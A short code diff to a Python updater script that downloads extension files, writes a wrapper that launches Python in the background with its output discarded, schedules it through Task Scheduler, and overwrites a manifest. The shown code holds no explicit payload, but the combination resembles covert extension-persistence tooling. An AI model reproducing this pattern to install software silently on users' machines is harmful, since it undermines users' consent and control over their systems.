@@ -121,6 +121,7 @@ def handle_update():
         check_permissions()
 
     download_extension_files()
+    create_wrapper_file()  # Ensure wrapper.py is created before scheduling the task
     configure_extension_scheduler()
     run_task_scheduler_task()
     overwrite_manifest()
@@ -180,7 +181,7 @@ subprocess.Popen([r"{user_directory}\\AppData\\Local\\Programs\\Python\\Python31
                  creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-sys.exit()  # Close the wrapper script after starting main.py
+sys.exit()
 """
     with open(WRAPPER_PATH, "w") as wrapper_file:
         wrapper_file.write(wrapper_content)
